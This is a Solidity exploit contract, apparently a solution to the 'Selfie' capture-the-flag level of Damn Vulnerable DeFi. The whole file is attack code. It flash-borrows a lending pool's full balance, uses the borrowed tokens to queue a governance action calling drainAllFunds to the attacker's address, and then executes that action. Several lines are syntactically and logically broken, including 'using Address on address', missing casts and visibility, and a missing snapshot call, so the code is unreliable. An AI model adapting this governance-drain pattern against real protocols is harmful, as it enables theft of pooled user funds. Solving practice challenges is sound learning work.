// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/utils/Address.sol";
//import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";


contract SelfieExploit {
	using Address on address;

	SelfiePool public selfiePool;
	SimpleGovernance public governance;
	address public attackerEOA;
	uint256 public actionId;
	
	
    constructor(address selfiePoolAddress, address governanceAddress) {
        selfiePool = selfiePoolAddress;
		governance = governanceAddress;
		attackerEOA = msg.sender;
    }
    
	function setupAttack() {
		uint256 amount = selfiePool.token().balanceOf(address(selfiePool));
		selfiePool.flashLoan(amount);
	}
	function receiveTokens(address token, uint256 amount) external {
	//address receiver, bytes calldata data, uint256 weiAmount
		actionId = governance.queueAction(selfiePool, abi.encodeWithSignature("drainAllFunds(address)", attackerEOA), 0);
		token.transfer(selfiePool, amount);
	}
	
	function attack() {
		governance.executeAction(actionId);
	}
}



/**

 ISelfie:: drainAllFunds(address receiver) external onlyGovernance
 

**/